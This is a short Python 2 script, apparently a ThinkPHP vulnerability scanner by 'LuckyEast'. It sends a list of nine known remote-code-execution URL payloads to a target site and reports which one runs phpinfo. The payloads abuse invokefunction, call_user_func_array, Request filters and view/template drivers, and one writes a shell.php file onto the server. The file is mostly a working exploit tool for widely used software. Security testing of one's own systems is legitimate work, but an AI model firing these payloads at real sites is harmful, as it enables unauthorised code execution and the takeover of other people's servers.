import sys
import requests
from bs4 import BeautifulSoup
from argparse import ArgumentParser

print '''
-------------------------------------
ThinkPHP test script by LuckyEast >_< 
-------------------------------------
'''

global result_type
result_type = 0

payload_list = [
    "/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
    "/?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
    "/?s=index/\\think\Request/input&filter=phpinfo&data=1",
    "/?s=index/\\think\\template\driver\\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E",
    "/?s=index/\\think\\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E",
    "/?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
    "/?s=index/\\think\module/action/param1/${@phpinfo()}",
    "/?s=index/\\think\Module/Action/Param/${@phpinfo()}",
    "/?s=index/\\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1"
]

def test(url):
    global result_type
    for i in payload_list:
        test_url = url + i
        rsp_text = requests.get(url=test_url).text
        soup_text = BeautifulSoup(rsp_text, "lxml").text
        if 'PHP Version' in soup_text:
            print '[+] RCE is exists, exp can use ' + i
            result_type = 1

if __name__ == "__main__":
    url = sys.argv[1]
    test(url)
    if result_type == 0:
        print '[-] RCE not found!'
